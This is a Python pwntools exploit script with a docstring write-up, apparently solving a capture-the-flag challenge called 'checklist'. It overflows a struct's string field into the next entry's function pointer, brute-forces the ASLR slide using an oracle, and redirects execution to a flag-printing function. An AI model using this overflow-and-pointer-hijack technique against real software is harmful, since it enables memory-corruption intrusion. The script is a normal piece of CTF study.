from pwn import *


'''
The bug is that we have the following struct 
struct work { 
    work_func_t formater;
    char str_data[WORK_SIZE-sizeof(void*)];
};

But we do `fgets(item->str_data, sizeof(struct work), stdin);` i.e. we use the full size not used the str storage size.

This allows us to overflow the next spot in the array. This can be used together with the deferred command to over flow
the next functions pointer. 
We have a partial leak from the first print but we need to leak the full address.
We can do this with the `handle_populate` function as an validation oracle, if we overflow with the correct address 
of the print_deferred function the next entry will be handled as a deferred entry, otherwise not. 
Using this we can confirm or deny a ASLR slide. 

If we are lucky with the ASLR slide (most of the time) we can also use a normal print overflow, followed by another
print to leak the ASLR. When we add the second print we repopulate the end of the large string so the print cmd will 
then print the function pointer. This works if the ASLR slide does not cause the pointer to contain a 00 byte. 

If we want to prevent this method (i.e. getting lucky), the checklist-aligned build ensure that all functions will contain a 
null byte.

With the ASLR slide leaked we can set up an overflow that will point the formatter to point to the flag print function
giving us the win.
'''


context.binary = binary = ELF("./checklist")

#p = process()
p = remote('127.0.0.1', 31340)
#gdb.attach(p)


the_base = 0x0055555500000000
offset = binary.sym.print_deferred




def check_addr(p, addr): 
    (p.recvuntil("#"))
    p.sendline("7")
    (p.recvuntil("#"))
    p.sendline("3")
    (p.recvuntil("#"))
    p.sendline("3")
    (p.recvuntil("#"))
    p.sendline("4")
    (p.recvuntil("added!"))
    (p.recv())
    (hex(addr), b"G"*(120) + p64(addr))
    p.sendline(b"A"*(120) + p64(addr))
    p.sendline("B")
    output = (p.recvuntil("deferred lines...").decode("utf-8"))
    (output)
    
    
    return "Updated 2 deferred lines" in output



inout = (p.recvuntil("#").decode("utf-8"))
print(inout)
index = inout.find("at star address 0x")

hex_base = "0x" + inout[index+len("at star address 0x"):].split(" ")[0]
addr = int(hex_base, 16) 
addr = addr &0xffffffffffff0000
addr = addr - 0x2000
#print(hex(addr))
p.sendline("7")
print_deferred_addr = 0
for i in range(addr, 0x0057555500000000,0x1000):
    print("checking", hex(i + offset))
    # Skip this since it will be a 0a aka newline followed by 0x38 aka 8 causing a crash
    if( ((i + offset ) & 0xffffff) == 0x380a40):
        print("skipping")
        continue
    val = check_addr(p,i + offset)
    if val: 
        print("found at: ", hex(i))
        print_deferred_addr = i + offset
        break


print("Doing lines: ", hex(i))
print("addr:", hex(print_deferred_addr - binary.sym.print_deferred + binary.sym.print_the_flag))

p.sendline("7")
p.recvuntil("#")

p.sendline("3")
p.recvuntil("#")
p.sendline("1")
p.recvuntil("#")
p.sendline("4")
p.recvuntil("added!")
print("addr:", hex(print_deferred_addr - binary.sym.print_deferred + binary.sym.print_the_flag))
p.sendline((b"A"*(120) + p64(print_deferred_addr - binary.sym.print_deferred + binary.sym.print_the_flag)))
p.recvuntil("#")
p.sendline("8")
(p.recvuntil("launch code is"))
print(p.recvline("#").decode("utf-8"))
#
p.sendline("99")
